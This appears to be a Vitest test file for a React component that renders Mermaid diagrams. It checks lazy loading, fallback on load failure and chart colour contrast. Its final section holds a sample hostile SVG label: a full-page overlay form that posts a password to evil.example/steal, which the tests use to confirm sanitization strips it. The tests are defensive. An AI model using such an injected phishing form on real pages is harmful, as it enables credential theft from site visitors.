import fs from 'node:fs'
import path from 'node:path'
import { render, screen } from '@testing-library/react'
import { afterEach, describe, expect, it, vi } from 'vitest'
import { LABEL_PURIFY_CONFIG } from './diagram-safety'

const ROOTS = ['app', 'components', 'lib', 'i18n']
const ALLOWED = ['components/site/blocks/DiagramView.tsx']

function walk(dir: string, out: string[] = []): string[] {
  for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
    const full = path.join(dir, entry.name)
    if (entry.isDirectory()) walk(full, out)
    else if (/\.(ts|tsx)$/.test(entry.name) && !/\.(test|spec)\.tsx?$/.test(entry.name)) out.push(full)
  }
  return out
}

/** A way of reaching the library: `from 'mermaid'`, `import('mermaid')` or `require('mermaid')` (the word alone is also a diagram type of the registry). */
const REACHES = /(?:from\s+|import\(\s*|require\(\s*)['"]mermaid['"]/

const rel = (file: string) => path.relative('.', file).split(path.sep).join('/')

describe('where mermaid is loaded', () => {
  const sources = ROOTS.flatMap((root) => walk(root)).map((file) => ({ file: rel(file), text: fs.readFileSync(file, 'utf8') }))

  it('is mentioned by one file only, so one place decides when the library is downloaded', () => {
    const mentions = sources.filter(({ text }) => REACHES.test(text)).map(({ file }) => file)

    expect(mentions).toEqual(ALLOWED)
  })

  it('is never imported at the top of a module: only a dynamic import() inside the browser-only island', () => {
    for (const { file, text } of sources) {
      expect(text, file).not.toMatch(/^\s*(?:import|export)\s[^('"]*from\s+['"]mermaid['"]/m)
      expect(text, file).not.toMatch(/require\(\s*['"]mermaid['"]/)
    }
    const island = sources.find(({ file }) => file === ALLOWED[0])!
    expect(island.text.trimStart()).toMatch(/^'use client'/)
    expect(island.text).toMatch(/import\(\s*'mermaid'\s*\)/)
  })

  it('keeps the island client-only and the block that draws its frame a server component', () => {
    const frame = sources.find(({ file }) => file === 'components/site/blocks/Diagram.tsx')!
    expect(frame.text).not.toMatch(/^\s*['"]use client['"]/m)
    expect(frame.text).not.toMatch(REACHES)
  })
})

describe('DiagramView: the library cannot be loaded', () => {
  afterEach(() => {
    vi.doUnmock('mermaid')
    vi.resetModules()
  })

  it('keeps the source and says so, then tries again for the next diagram', async () => {
    vi.resetModules()
    vi.doMock('mermaid', () => {
      throw new Error('chunk load failed')
    })
    const { DiagramView } = await import('./DiagramView')

    const first = render(<DiagramView source="graph TD" label="Flow" failedMessage="Could not draw it." />)
    expect(await screen.findByText('Could not draw it.')).toBeInTheDocument()
    expect(first.container.querySelector('pre')!.textContent).toBe('graph TD')
    first.unmount()

    // The failed load is not remembered: once the library is there, the next diagram draws.
    vi.doMock('mermaid', () => ({
      default: { initialize: vi.fn(), render: vi.fn(async () => ({ svg: '<svg viewBox="0 0 1 1"><text>back</text></svg>' })) },
    }))
    render(<DiagramView source="graph TD" label="Flow" failedMessage="Could not draw it." />)
    expect(await screen.findByRole('img', { name: 'Flow' })).toHaveTextContent('back')
  })
})

/** The WCAG relative luminance of a `#rrggbb` colour, and the contrast ratio of two of them. */
function luminance(hex: string): number {
  const channel = (offset: number) => {
    const value = parseInt(hex.slice(offset, offset + 2), 16) / 255
    return value <= 0.03928 ? value / 12.92 : ((value + 0.055) / 1.055) ** 2.4
  }
  return 0.2126 * channel(1) + 0.7152 * channel(3) + 0.0722 * channel(5)
}
const contrast = (a: string, b: string) => {
  const [high, low] = [luminance(a), luminance(b)].sort((x, y) => y - x)
  return (high + 0.05) / (low + 0.05)
}

describe('DiagramView: the colours of a chart', () => {
  afterEach(() => {
    vi.doUnmock('mermaid')
    vi.resetModules()
  })

  // The blind authors drew a bar chart with `xychart-beta`: the library paints the first series lavender (#ECECFF), which all but
  // vanishes on a white page (1.2 to 1), so the bars were found only through the axes. The page gives the chart its own palette.
  it('gives the bars of an xychart colours that stand out from a light page and from a dark page', async () => {
    vi.resetModules()
    const initialize = vi.fn()
    vi.doMock('mermaid', () => ({
      default: { initialize, render: vi.fn(async () => ({ svg: '<svg viewBox="0 0 1 1"><text>chart</text></svg>' })) },
    }))
    const { DiagramView } = await import('./DiagramView')

    render(<DiagramView source="xychart-beta" label="Chart" failedMessage="Could not draw it." />)
    expect(await screen.findByRole('img', { name: 'Chart' })).toHaveTextContent('chart')

    const palette = initialize.mock.calls[0][0].themeVariables.xyChart.plotColorPalette.split(',') as string[]
    expect(palette.length).toBeGreaterThanOrEqual(4)
    for (const colour of palette) {
      expect(colour, colour).toMatch(/^#[0-9a-f]{6}$/i)
      expect(contrast(colour, '#ffffff'), `${colour} on white`).toBeGreaterThanOrEqual(3)
      expect(contrast(colour, '#171717'), `${colour} on a dark page`).toBeGreaterThanOrEqual(3)
    }
  })
})

/**
 * A drawing the library might return for a node whose label an author wrote: the label holds a live form with every control, an
 * external action, a style that covers the page and a link, next to the label text and the layout style the library gives it.
 */
const HOSTILE_DRAWING =
  '<svg viewBox="0 0 100 50"><g class="node"><rect width="90" height="24"></rect></g>' +
  '<foreignObject width="90" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap;">' +
  '<span class="nodeLabel"><p>Visible label</p>' +
  '<form action="https://evil.example/steal" method="post" style="position:fixed;inset:0;background:white">' +
  '<input name="p" type="password"><button>Sign in</button><textarea>t</textarea><select><option>1</option></select><label>l</label>' +
  '</form><a href="https://evil.example" style="color:red">link</a></span></div></foreignObject></svg>'

describe('DiagramView: what an author can put into a label', () => {
  afterEach(() => {
    vi.doUnmock('mermaid')
    vi.resetModules()
  })

  async function drawHostile() {
    vi.resetModules()
    const initialize = vi.fn()
    vi.doMock('mermaid', () => ({ default: { initialize, render: vi.fn(async () => ({ svg: HOSTILE_DRAWING })) } }))
    const { DiagramView } = await import('./DiagramView')
    render(<DiagramView source="graph TD" label="Flow" failedMessage="Could not draw it." />)
    return { host: await screen.findByRole('img', { name: 'Flow' }), initialize }
  }

  it('draws the label text and no form, control or link from it', async () => {
    const { host } = await drawHostile()

    expect(host.querySelector('svg')).not.toBeNull()
    expect(host.querySelector('foreignObject')).toHaveTextContent('Visible label')
    for (const tag of ['form', 'input', 'button', 'textarea', 'select', 'option', 'label', 'a']) {
      expect(host.querySelector(tag), tag).toBeNull()
    }
  })

  it('leaves no style in a label that could cover or move anything on the page', async () => {
    const { host } = await drawHostile()

    const styles = [...host.querySelector('foreignObject')!.querySelectorAll('[style]')].map((element) =>
      element.getAttribute('style'),
    )
    expect(styles).toEqual(['display: table-cell; white-space: nowrap'])
    expect(host.innerHTML).not.toMatch(/position|inset|background|evil\.example/)
  })

  it('asks the library to clean the labels with an allowlist of formatting tags and no attribute', async () => {
    const { initialize } = await drawHostile()

    const options = initialize.mock.calls[0][0]
    expect(options.securityLevel).toBe('strict')
    expect(options.dompurifyConfig).toEqual(LABEL_PURIFY_CONFIG)
    expect(options.dompurifyConfig.ALLOWED_ATTR).toEqual([])
    for (const tag of ['form', 'input', 'button', 'select', 'textarea', 'option', 'label', 'a', 'img', 'style']) {
      expect(options.dompurifyConfig.ALLOWED_TAGS, tag).not.toContain(tag)
    }
  })
})
